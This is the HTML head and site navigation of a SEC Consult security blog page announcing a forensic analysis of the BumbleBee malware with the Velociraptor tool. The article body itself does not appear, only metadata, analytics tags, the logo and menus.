<!DOCTYPE html>
<html lang="en">
<head>
<script async src="https://www.googletagmanager.com/gtag/js?id=AW-983134711"></script>
<script type="text/javascript">
window.dataLayer = window.dataLayer || [];
function gtag(){dataLayer.push(arguments)};
gtag('js', new Date());
gtag('config', 'AW-983134711', { 'anonymize_ip': true });
</script>
<link rel="dns-prefetch" href="https://www.googletagmanager.com">
<link rel="preconnect" href="https://www.googletagmanager.com">

<meta charset="utf-8">
<!-- 
	Website by LIMESODA Interactive Marketing GmbH | www.limesoda.com

	This website is powered by TYPO3 - inspiring people to share!
	TYPO3 is a free open source Content Management Framework initially created by Kasper Skaarhoj and licensed under GNU/GPL.
	TYPO3 is copyright 1998-2024 of Kasper Skaarhoj. Extensions are copyright of their respective owners.
	Information and contribution at https://typo3.org/
-->


<link rel="icon" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon.ico" type="image/vnd.microsoft.icon">
<title>BumbleBee hunting with a Velociraptor - SEC Consult</title>
<meta name="generator" content="TYPO3 CMS">
<meta name="description" content="BumbleBee, a malware which is mainly abused by threat actors in data exfiltration and ransomware incidents, was recently analyzed by Angelo Violetti of SEC Defence - the SEC Consult Digital Forensics and Incident Response team. ">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="index,follow">
<meta property="og:title" content="BumbleBee hunting with a Velociraptor">
<meta property="og:type" content="article">
<meta property="og:url" content="https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/">
<meta property="og:image" content="https://sec-consult.com/fileadmin/user_upload/sec-consult/Dynamisch/Blogartikel/2023_04/sec-consult-h-velociraptor-bumblebee.jpg">
<meta property="og:image:width" content="964">
<meta property="og:image:height" content="560">
<meta property="og:description" content="BumbleBee, a malware which is mainly abused by threat actors in data exfiltration and ransomware incidents, was recently analyzed by Angelo Violetti of SEC Defence - the SEC Consult Digital Forensics and Incident Response team. ">
<meta property="og:site_name" content="SEC Consult">
<meta name="twitter:card" content="summary">
<meta name="google" content="notranslate">
<meta name="apple-mobile-web-app-capable" content="no">
<meta name="format-detection" content="telephone=no">


<link rel="stylesheet" href="/typo3temp/assets/compressed/merged-19595b1f9ae01c2e960d35548c61bc33-7b67c900eca100d2d1f2ced809f837bf.css?1733121259" media="all">



<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/manifest.js?1733121063" defer="defer"></script>
<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/vendor.js?1733121063" defer="defer"></script>

<script src="/_assets/a657ba44cf46d783808c83ee81b78057/JavaScript/main.js?1733121063" defer="defer"></script>



<link rel="apple-touch-icon" sizes="180x180" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/favicon-16x16.png">
<link rel="manifest" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/site.webmanifest">
<link rel="mask-icon" href="/_assets/a657ba44cf46d783808c83ee81b78057/Icons/Favicons/safari-pinned-tab.svg" color="#ea8923">
<meta name="msapplication-TileColor" content="#ffffff">
<meta name="theme-color" content="#ffffff">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Icons/icons.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-500.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-700.woff2" type="font/woff2" crossorigin="anonymous">
<link rel="preload" as="font" href="/_assets/a657ba44cf46d783808c83ee81b78057/Fonts/Roboto/roboto-v20-latin-regular.woff2" type="font/woff2" crossorigin="anonymous">
<script type="application/ld+json">{"@context":"https://schema.org","@type":"Organization","name":"SEC Consult Unternehmensberatung GmbH","url":"https://sec-consult.com/","email":"office@sec-consult.com","logo":"https://sec-consult.com/fileadmin/user_upload/sec-consult/SEC-Consult-Logo.png","foundingDate":"2002","foundingLocation":{"@type":"City","name":"Wiener Neustadt"},"location":[{"@type":"LocalBusiness","name":"SEC Consult Unternehmensberatung GmbH","image":"https://sec-consult.com/fileadmin/user_upload/sec-consult/SEC-Consult-Logo.png","telephone":"+43 1 890 30 43 0","address":{"@type":"PostalAddress","streetAddress":"Wagramer Straße 19 / 16. Stock","postalCode":"1220","addressRegion":"Wien","addressCountry":"Österreich"},"geo":{"@type":"GeoCoordinates","latitude":48.23487,"longitude":16.4208}}],"sameAs":["https://sec-consult.com","https://twitter.com/sec_consult","https://www.linkedin.com/company/sec-consult","https://www.xing.com/companies/secconsultunternehmensberatunggmbh"],"telephone":"+43 1 890 30 43 0"}</script>
<link rel="canonical" href="https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"/>

<link rel="alternate" hreflang="en-us" href="https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"/>
<link rel="alternate" hreflang="de-AT" href="https://sec-consult.com/de/blog/detail/bumblebee-jagd-mit-velociraptor/"/>
<link rel="alternate" hreflang="x-default" href="https://sec-consult.com/blog/detail/bumblebee-hunting-with-a-velociraptor/"/>
<script id="ls-cookie-consent" type="application/json">{"groups":{"group-2":{"cookie-5":{"gtm-trigger":"","header":["<!-- Matomo Tag Manager -->\r\n<script>\r\nvar _mtm = window._mtm = window._mtm || [];\r\n_mtm.push({'mtm.startTime': (new Date().getTime()), 'event': 'mtm.Start'});\r\nvar d=document, g=d.createElement('script'), s=d.getElementsByTagName('script')[0];\r\ng.async=true; g.src='https:\/\/sec-consult.com\/matomo\/js\/container_EbyLTruV.js'; s.parentNode.insertBefore(g,s);\r\n<\/script>\r\n<!-- End Matomo Tag Manager -->"]}}},"options":{"forceConsent":false,"hideOptions":false,"noTracking":false},"rootPid":1}</script>
<!-- This site is optimized with the Yoast SEO for TYPO3 plugin - https://yoast.com/typo3-extensions-seo/ -->
<script type="application/ld+json">[{"@context":"https:\/\/www.schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"item":{"@id":"https:\/\/sec-consult.com\/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@id":"https:\/\/sec-consult.com\/blog\/","name":"Blog"}},{"@type":"ListItem","position":3,"item":{"@id":"https:\/\/sec-consult.com\/blog\/detail\/","name":"Detail"}}]}]</script>
</head>
<body id="p31" class="page-31 pagelevel-2 language-en backendlayout-default layout-0" itemscope itemtype="https://schema.org/WebPage">




<div class="wrapper"><header class="page-header"><div class="page-header-container"><nav class="navbar"><div class="navbar-left"><a class="navbar__home-link" title="Home" href="/"><svg xmlns="http://www.w3.org/2000/svg" class="navbar-logo" id="Ebene_1" data-name="Ebene 1" viewBox="0 0 306.85 88.37" width="230" height="67" aria-hidden="true"><defs><style>
      .cls-1{fill:#fff}.cls-3{fill:#333c42}
    </style></defs><path d="M306.85 61.56c0 2.87-2.31 5.19-5.17 5.19H5.17C2.32 66.75 0 64.43 0 61.56V5.19C0 2.32 2.31 0 5.17 0h296.51c2.85 0 5.17 2.32 5.17 5.19v56.37Z" class="cls-1"/><path d="M305.33 61.57c0 1.82-1.83 3.67-3.66 3.67H5.14c-1.83 0-3.63-1.8-3.63-3.67V5.2c0-1.83 1.78-3.68 3.65-3.68h296.51c1.81 0 3.66 1.85 3.66 3.67v56.38Z" class="cls-3"/><path d="M64.85 57.04c0 2.89-1.06 3.95-3.94 3.95H9.42c-2.89 0-3.94-1.06-3.94-3.95V9.49c0-2.89 1.06-3.95 3.94-3.95h51.49c2.89 0 3.94 1.06 3.94 3.95v47.55Z" class="cls-1"/><path fill="#6f8591" d="m35.44 6.23 8.51 17.24 19.03 2.77-13.77 13.42 3.25 18.95-17.02-8.95-17.02 8.95 3.25-18.95L7.9 26.24l19.03-2.77 8.51-17.24z"/><path fill="#a2bfce" d="m35.44 6.23 8.51 17.24-3.65 10.19 22.68-7.42-13.77 13.42-7.27 4.49 10.52 14.46-17.02-8.95-5.7-6.69-11.32 15.64 3.25-18.95 5.36-7.21L7.9 26.24l18.42-2.68 9.13 3.61-.01-20.94z"/><circle cx="35.41" cy="34.7" r="16.02" class="cls-1"/><path d="M50.34 34.7c0 8.24-6.68 14.93-14.93 14.93S20.48 42.95 20.48 34.7s6.68-14.93 14.93-14.93 14.93 6.68 14.93 14.93Z" class="cls-3"/><path d="M47.79 34.7c0 6.84-5.54 12.38-12.38 12.38S23.03 41.54 23.03 34.7s5.54-12.38 12.38-12.38 12.38 5.54 12.38 12.38Z" class="cls-1"/><path fill="#f7941d" d="M46.7 34.7c0 6.23-5.05 11.29-11.29 11.29S24.12 40.94 24.12 34.7s5.05-11.29 11.29-11.29S46.7 28.46 46.7 34.7Z"/><path d="M77.95 42.18c1.66.94 4.32 1.88 7.02 1.88 2.91 0 4.45-1.3 4.45-3.27s-1.33-2.96-4.7-4.22c-4.65-1.79-7.73-4.58-7.73-8.97 0-5.16 4.03-9.06 10.59-9.06 3.2 0 5.48.67 7.15 1.53l-1.41 5.47c-1.08-.58-3.12-1.44-5.82-1.44s-4.07 1.39-4.07 2.92c0 1.93 1.54 2.78 5.19 4.26 4.94 1.97 7.23 4.76 7.23 9.02 0 5.07-3.57 9.38-11.26 9.38-3.2 0-6.36-.94-7.94-1.88l1.29-5.61ZM116.84 36.44h-10.3v7.18h11.51v5.61h-17.83V18.99h17.24v5.61h-10.93v6.28h10.3v5.56ZM142.89 48.41c-1.12.58-3.78 1.3-7.15 1.3-9.68 0-14.67-6.55-14.67-15.16 0-10.32 6.81-16.02 15.29-16.02 3.28 0 5.78.67 6.9 1.35l-1.33 5.38c-1.25-.58-3.03-1.12-5.32-1.12-4.99 0-8.89 3.27-8.89 10 0 6.06 3.32 9.87 8.93 9.87 1.95 0 4.03-.4 5.32-.99l.91 5.38ZM176.01 48.41c-1.12.58-3.78 1.3-7.15 1.3-9.68 0-14.67-6.55-14.67-15.16 0-10.32 6.81-16.02 15.29-16.02 3.28 0 5.78.67 6.9 1.35l-1.33 5.38c-1.25-.58-3.03-1.12-5.32-1.12-4.99 0-8.89 3.27-8.89 10 0 6.06 3.32 9.87 8.93 9.87 1.95 0 4.03-.4 5.32-.99l.91 5.38ZM199.28 38.01c0 8.03-5.28 11.71-10.72 11.71-5.94 0-10.51-4.22-10.51-11.31s4.32-11.66 10.89-11.66c6.19 0 10.35 4.62 10.35 11.26Zm-14.71.22c0 3.77 1.45 6.59 4.15 6.59 2.49 0 4.03-2.65 4.03-6.64 0-3.23-1.16-6.55-4.03-6.55s-4.15 3.36-4.15 6.59ZM203.18 34.28c0-2.74-.08-5.02-.17-7h5.49l.29 3.05h.12a7.185 7.185 0 0 1 6.27-3.54c4.15 0 7.27 3.01 7.27 9.47v12.97h-6.32V37.07c0-2.83-.91-4.76-3.2-4.76-1.75 0-2.78 1.3-3.24 2.56-.17.45-.21 1.08-.21 1.7v12.65h-6.31V34.28ZM227.49 43.3c1.16.76 3.57 1.62 5.44 1.62s2.7-.67 2.7-1.8-.62-1.7-2.95-2.56c-4.24-1.53-5.86-3.99-5.82-6.59 0-4.13 3.24-7.22 8.27-7.22 2.37 0 4.45.63 5.69 1.3l-1.08 4.71c-.91-.54-2.7-1.26-4.4-1.26-1.54 0-2.41.67-2.41 1.75s.79 1.61 3.28 2.56c3.86 1.44 5.44 3.59 5.49 6.77 0 4.13-2.95 7.13-8.77 7.13-2.66 0-5.03-.67-6.56-1.57l1.12-4.84ZM264.72 42.18c0 2.87.08 5.2.17 7.04h-5.48l-.29-3.1H259c-.79 1.35-2.7 3.59-6.36 3.59-4.16 0-7.15-2.78-7.15-9.56V27.27h6.32v11.8c0 3.19.96 5.11 3.2 5.11 1.75 0 2.78-1.3 3.16-2.38.17-.4.25-.9.25-1.48V27.27h6.32v14.89ZM269.79 17.37h6.32v31.85h-6.32V17.37ZM288.28 21.36v5.92h4.53v5.02h-4.53v7.94c0 2.65.62 3.86 2.49 3.86.87 0 1.29-.05 1.87-.18l.04 5.16c-.79.31-2.33.58-4.07.58-2.04 0-3.74-.76-4.78-1.88-1.16-1.3-1.75-3.41-1.75-6.51V32.3h-2.7v-5.02h2.7V23.2l6.19-1.84Z" class="cls-1"/><path d="M147.59 88.37c-.66 0-1.24-.11-1.73-.33s-.88-.53-1.15-.93c-.27-.4-.4-.85-.4-1.35s.11-.91.34-1.31c.23-.39.6-.7 1.12-.94.52-.23 1.22-.35 2.1-.35h2.81v1.15h-2.75c-.8 0-1.34.13-1.62.4s-.42.59-.42.97c0 .44.17.78.52 1.05.35.26.83.39 1.44.39s1.13-.13 1.58-.4.78-.66.98-1.17l.32 1.11c-.21.52-.59.94-1.12 1.25-.54.31-1.21.46-2.03.46Zm2.91-.1V86.4l-.08-.35v-3.2c0-.68-.2-1.21-.59-1.58-.4-.37-.99-.56-1.78-.56-.52 0-1.04.09-1.54.26s-.93.4-1.27.69l-.67-1.2c.46-.37 1.01-.65 1.65-.85.64-.2 1.31-.29 2.02-.29 1.22 0 2.15.3 2.81.89s.99 1.5.99 2.71v5.36h-1.52ZM159.74 79.31c.73 0 1.36.14 1.92.42s.98.7 1.3 1.27c.31.57.47 1.29.47 2.16v5.11h-1.61v-4.92c0-.86-.21-1.51-.63-1.94s-1.01-.65-1.77-.65c-.57 0-1.07.11-1.49.33-.42.22-.75.55-.98.99s-.34.98-.34 1.62v4.57H155V79.4h1.54v2.39l-.25-.64c.29-.58.74-1.03 1.34-1.36s1.31-.49 2.11-.49ZM172.81 86.81h6.83v1.46h-8.5V76.55h8.27v1.46h-6.6v8.8Zm-.15-5.21h6.03v1.42h-6.03V81.6ZM184.3 88.27l-3.88-8.87h1.67l3.45 8.03h-.8l3.52-8.03h1.57l-3.88 8.87h-1.64ZM192.13 77.69c-.31 0-.57-.1-.78-.3s-.31-.45-.31-.74.1-.55.31-.75c.21-.2.47-.3.78-.3s.57.1.78.29c.21.2.31.44.31.73s-.1.56-.3.76c-.2.21-.46.31-.79.31Zm-.8 10.58V79.4h1.61v8.87h-1.61ZM199.66 88.37c-.86 0-1.63-.19-2.3-.57-.68-.38-1.21-.91-1.6-1.59-.39-.68-.59-1.47-.59-2.38s.19-1.69.59-2.37c.39-.68.92-1.2 1.6-1.58.68-.38 1.44-.57 2.3-.57.75 0 1.42.17 2.03.5s1.09.84 1.45 1.51c.36.67.54 1.51.54 2.51s-.18 1.84-.53 2.51c-.35.67-.83 1.18-1.43 1.52-.6.34-1.29.51-2.06.51Zm.13-1.41c.56 0 1.06-.13 1.52-.39.45-.26.81-.62 1.07-1.1.26-.47.39-1.02.39-1.65s-.13-1.19-.39-1.65c-.26-.46-.62-.82-1.07-1.08-.45-.26-.96-.39-1.52-.39s-1.08.13-1.52.39c-.45.26-.8.62-1.07 1.08-.27.46-.4 1.01-.4 1.65s.13 1.17.4 1.65.62.84 1.07 1.1c.45.26.95.39 1.52.39Zm3.03 1.31v-2.39l.1-2.06-.17-2.06v-5.91h1.61v12.42h-1.54ZM211.36 88.37c-.95 0-1.78-.19-2.5-.59-.72-.39-1.28-.93-1.67-1.61s-.59-1.46-.59-2.34.19-1.66.58-2.34c.39-.68.92-1.21 1.59-1.6.67-.39 1.44-.58 2.28-.58s1.62.19 2.28.57c.66.38 1.17.91 1.55 1.6.37.69.56 1.49.56 2.4v.23c0 .09-.01.17-.03.25h-7.55v-1.15h6.71l-.65.4a3.02 3.02 0 0 0-.35-1.52c-.25-.45-.58-.8-1.01-1.05-.43-.25-.93-.38-1.5-.38s-1.06.13-1.49.38-.78.6-1.02 1.05c-.25.45-.37.97-.37 1.55v.27c0 .59.14 1.12.41 1.58.27.46.65.82 1.15 1.08.49.26 1.06.39 1.69.39.52 0 1-.09 1.43-.27.43-.18.81-.45 1.13-.8l.89 1.04c-.4.47-.9.83-1.5 1.07s-1.26.37-2 .37ZM222.39 79.31c.73 0 1.36.14 1.92.42s.98.7 1.3 1.27c.31.57.47 1.29.47 2.16v5.11h-1.61v-4.92c0-.86-.21-1.51-.63-1.94s-1.01-.65-1.77-.65c-.57 0-1.07.11-1.49.33-.42.22-.75.55-.98.99s-.34.98-.34 1.62v4.57h-1.61V79.4h1.54v2.39l-.25-.64c.29-.58.74-1.03 1.34-1.36s1.31-.49 2.11-.49ZM233.56 88.27V75.85h1.61v5.91l-.17 2.06.1 2.06v2.39h-1.54Zm4.7.1c-.76 0-1.44-.17-2.05-.51-.61-.34-1.09-.85-1.44-1.52-.35-.67-.53-1.51-.53-2.51s.18-1.84.54-2.51c.36-.67.85-1.17 1.46-1.51.61-.33 1.28-.5 2.02-.5.87 0 1.64.19 2.31.57.67.38 1.2.91 1.59 1.58s.59 1.46.59 2.37-.2 1.7-.59 2.38-.92 1.21-1.59 1.59c-.67.38-1.44.57-2.31.57Zm-.13-1.41c.57 0 1.08-.13 1.53-.39.45-.26.81-.62 1.07-1.1.26-.47.39-1.02.39-1.65s-.13-1.19-.39-1.65c-.26-.46-.62-.82-1.07-1.08-.45-.26-.96-.39-1.53-.39s-1.06.13-1.51.39c-.45.26-.81.62-1.07 1.08-.26.46-.39 1.01-.39 1.65s.13 1.17.39 1.65.62.84 1.07 1.1c.45.26.96.39 1.51.39ZM248.71 88.37c-.76 0-1.43-.14-2-.42-.57-.28-1.02-.71-1.34-1.28-.32-.57-.48-1.3-.48-2.17v-5.11h1.61v4.92c0 .87.21 1.52.63 1.96.42.44 1.01.65 1.77.65.56 0 1.04-.11 1.46-.34s.73-.56.95-1c.22-.44.33-.97.33-1.6v-4.59h1.61v8.87h-1.52v-2.39l.25.64c-.29.59-.73 1.05-1.31 1.37-.58.32-1.23.49-1.96.49ZM258.85 88.37c-.74 0-1.44-.1-2.1-.3-.66-.2-1.19-.45-1.56-.74l.67-1.27c.38.26.85.47 1.41.65.56.18 1.13.27 1.71.27.75 0 1.29-.11 1.61-.32s.49-.51.49-.89c0-.28-.1-.5-.3-.65-.2-.16-.47-.27-.79-.35s-.69-.15-1.1-.21c-.4-.06-.8-.14-1.2-.23-.4-.09-.77-.23-1.11-.4-.33-.17-.6-.41-.8-.72s-.3-.72-.3-1.23.15-1 .45-1.41c.3-.4.73-.71 1.28-.93.55-.22 1.21-.33 1.97-.33.58 0 1.17.07 1.77.21s1.09.34 1.46.59l-.69 1.27c-.4-.27-.82-.45-1.26-.55-.44-.1-.87-.15-1.31-.15-.7 0-1.23.11-1.57.34s-.52.52-.52.88c0 .3.1.53.31.69.21.16.47.29.8.38s.69.16 1.1.23c.4.06.8.14 1.21.23.4.1.77.23 1.1.39s.6.4.8.7c.21.3.31.7.31 1.21 0 .54-.16 1-.47 1.39s-.75.69-1.32.91-1.25.33-2.04.33ZM265.49 77.69c-.31 0-.57-.1-.78-.3s-.31-.45-.31-.74.1-.55.31-.75c.21-.2.47-.3.78-.3s.57.1.78.29c.21.2.31.44.31.73s-.1.56-.3.76c-.2.21-.46.31-.79.31Zm-.8 10.58V79.4h1.61v8.87h-1.61ZM274.1 79.31c.73 0 1.36.14 1.92.42s.98.7 1.3 1.27c.31.57.47 1.29.47 2.16v5.11h-1.61v-4.92c0-.86-.21-1.51-.63-1.94s-1.01-.65-1.77-.65c-.57 0-1.07.11-1.49.33-.42.22-.75.55-.98.99s-.34.98-.34 1.62v4.57h-1.61V79.4h1.54v2.39l-.25-.64c.29-.58.74-1.03 1.34-1.36s1.31-.49 2.11-.49ZM284.71 88.37c-.95 0-1.78-.19-2.5-.59-.72-.39-1.28-.93-1.67-1.61s-.59-1.46-.59-2.34.19-1.66.58-2.34c.39-.68.92-1.21 1.59-1.6.67-.39 1.44-.58 2.28-.58s1.62.19 2.28.57c.66.38 1.17.91 1.55 1.6.37.69.56 1.49.56 2.4v.23c0 .09-.01.17-.03.25h-7.55v-1.15h6.71l-.65.4a3.02 3.02 0 0 0-.35-1.52c-.25-.45-.58-.8-1.01-1.05-.43-.25-.93-.38-1.5-.38s-1.06.13-1.49.38-.78.6-1.02 1.05c-.25.45-.37.97-.37 1.55v.27c0 .59.14 1.12.41 1.58.27.46.65.82 1.15 1.08.49.26 1.06.39 1.69.39.52 0 1-.09 1.43-.27.43-.18.81-.45 1.13-.8l.89 1.04c-.4.47-.9.83-1.5 1.07s-1.26.37-2 .37ZM293.55 88.37c-.74 0-1.44-.1-2.1-.3-.66-.2-1.19-.45-1.56-.74l.67-1.27c.38.26.85.47 1.41.65.56.18 1.13.27 1.71.27.75 0 1.29-.11 1.61-.32s.49-.51.49-.89c0-.28-.1-.5-.3-.65-.2-.16-.47-.27-.79-.35s-.69-.15-1.1-.21c-.4-.06-.8-.14-1.2-.23-.4-.09-.77-.23-1.11-.4-.33-.17-.6-.41-.8-.72s-.3-.72-.3-1.23.15-1 .45-1.41c.3-.4.73-.71 1.28-.93.55-.22 1.21-.33 1.97-.33.58 0 1.17.07 1.77.21s1.09.34 1.46.59l-.69 1.27c-.4-.27-.82-.45-1.26-.55-.44-.1-.87-.15-1.31-.15-.7 0-1.23.11-1.57.34s-.52.52-.52.88c0 .3.1.53.31.69.21.16.47.29.8.38s.69.16 1.1.23c.4.06.8.14 1.21.23.4.1.77.23 1.1.39s.6.4.8.7c.21.3.31.7.31 1.21 0 .54-.16 1-.47 1.39s-.75.69-1.32.91-1.25.33-2.04.33ZM301.93 88.37c-.74 0-1.44-.1-2.1-.3-.66-.2-1.19-.45-1.56-.74l.67-1.27c.38.26.85.47 1.41.65.56.18 1.13.27 1.71.27.75 0 1.29-.11 1.61-.32s.49-.51.49-.89c0-.28-.1-.5-.3-.65-.2-.16-.47-.27-.79-.35s-.69-.15-1.1-.21c-.4-.06-.8-.14-1.2-.23-.4-.09-.77-.23-1.11-.4-.33-.17-.6-.41-.8-.72s-.3-.72-.3-1.23.15-1 .45-1.41c.3-.4.73-.71 1.28-.93.55-.22 1.21-.33 1.97-.33.58 0 1.17.07 1.77.21s1.09.34 1.46.59l-.69 1.27c-.4-.27-.82-.45-1.26-.55-.44-.1-.87-.15-1.31-.15-.7 0-1.23.11-1.57.34s-.52.52-.52.88c0 .3.1.53.31.69.21.16.47.29.8.38s.69.16 1.1.23c.4.06.8.14 1.21.23.4.1.77.23 1.1.39s.6.4.8.7c.21.3.31.7.31 1.21 0 .54-.16 1-.47 1.39s-.75.69-1.32.91-1.25.33-2.04.33Z"/></svg></a></div><div class="navbar-right"><div class="navbar-toggle"><span class="sr-only" id="toggle-btn">Toggle Navbar</span><button class="navbar-toggle" data-toggle="#mainNav" data-toggle-global
                        aria-labelledby="toggle-btn"><span class="navbar-toggle--top"></span><span class="navbar-toggle--middle"></span><span class="navbar-toggle--bottom"></span></button></div><div class="navbar-nav" id="mainNav" data-toggle-animate><div class="nav-top"><div class="nav-top__item"><ul class="meta-nav"><li class="meta-nav__item"><a class="meta-nav__link" href="/career/">Career</a></li><li class="meta-nav__item"><a class="meta-nav__link" href="/about-us/">About us</a></li><li class="meta-nav__item"><a class="meta-nav__link" href="/contact/">Contact</a></li></ul></div><div class="nav-top__item"><ul id="language-nav" class="language-nav language-nav--0"><li class="language-nav__item language-nav__item--dropdown" data-toggle-hover><a class="language-nav__link language-nav__link--dropdown language-nav__link--active" href="#" data-toggle-media data-toggle="#languageNav" aria-expanded="false" data-toggle-group="navbar">
                            EN
                        </a><div class="language-nav__dropdown" id="languageNav" data-toggle-animate><ul class="language-nav language-nav--1"><li class="language-nav__item"><a class="language-nav__link" href="/de/blog/detail/bumblebee-jagd-mit-velociraptor/" hreflang="de-AT" title="German">
                                                        DE
                                                    </a></li></ul></div></li></ul></div><div class="nav-top__item"><div class="nav-search"><button class="nav-search__toggle"
        data-toggle-media
        data-toggle-global
        data-toggle="#searchContainer"
        type="button"
        aria-label="Toggle Search"><span class="i-search"></span><span class="i-close"></span></button><div id="searchContainer" class="nav-search__container" data-toggle-animate><form
            action="/search/"
            class="nav-search__form"
            id="searchForm"
            method="get"
        ><label class="label nav-search__label" id="input-label" for="input-id" aria-label="Search"><span class="sr-only">Search</span><input type="text"
                    id="input-id"
                    class="input__field nav-search__input"
                    name="tx_indexedsearch_pi2[search][sword]"
                    placeholder="Enter search term"><input type="hidden" name="tx_indexedsearch_pi2[action]" value="search" /><input type="hidden" name="tx_indexedsearch_pi2[controller]" value="Search" /></label><button type="submit" class="nav-search__submit" aria-label="Search"><span class="i-search"></span></button></form></div></div></div></div><div class="nav-bottom"><ul class="main-nav main-nav--0" role="menu"><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown9' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Security Testing
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown9" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown9" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/web-application-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Web Application Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/penetration-testing/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Penetration Testing
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/mobile-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Mobile Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/cloud-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Cloud Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/it-infrastructure-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        IT Infrastructure Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/security-for-sap-services/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Security for SAP Services
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/iot-and-embedded-systems-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        IoT and Embedded Systems Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/red-teaming/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Red Teaming
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown20' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Processes &amp; Organisation
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown20" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown20" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/information-security-management-ism/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Information Security Management (ISM)
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/network-and-information-systems-security-nis/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Network and Information Systems Security (NIS)
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/ot-security/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        OT Security
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/secure-software-development/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Secure Software Development Consulting
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/security-testing/red-teaming/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Red Teaming
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/sec-trainings/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        SEC Trainings
                                    </a></li><li class="main-nav__item main-nav__item--1" role="none"><a href="/processes-organisation/project-und-program-management/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        Project- und Program Management
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0 main-nav__item--dropdown" role="none" data-toggle-hover><span class="main-nav__link main-nav__link--no-link main-nav__link--0" tabindex="0"
                            role="menuitem"  data-toggle-media data-toggle='#dropdown26' aria-expanded='false' data-toggle-group='navbar'
                            >
                            Incident Response
                        </span><button class="main-nav__mobile-toggle" type="button" data-toggle-no-media data-toggle="#dropdown26" aria-expanded="false"><span class="i-down-open"></span></button><div class="main-nav__dropdown main-nav__dropdown--0" id="dropdown26" data-toggle-animate><ul class="main-nav main-nav--1"><li class="main-nav__item main-nav__item--1" role="none"><a href="/incident-response/sec-defence/"
                                    class="main-nav__link main-nav__link--1"
                                    >
                                        SEC Defence
                                    </a></li></ul></div></li><li class="main-nav__item main-nav__item--0" role="none" ><a href="/vulnerability-lab/"
                            class="main-nav__link main-nav__link--0"
                            role="menuitem" 
                            >
                            Vulnerability Lab
                        </a></li><li class="main-nav__item main-nav__item--0" role="none" ><a href="/blog/"
                            class="main-nav__link main-nav__link--0"
                            role="menuitem" 
                            >
                            Blog
                        </a></li></ul></div></div></div><a class="navbar-incident" href="/incident-response/sec-defence/"><div class="navbar-incident__left"><span class="i-incident"></span><br /><span>Incident?</span></div><div class="navbar-incident__right">
                                
                                    Breached?<br />Report an incident
                                
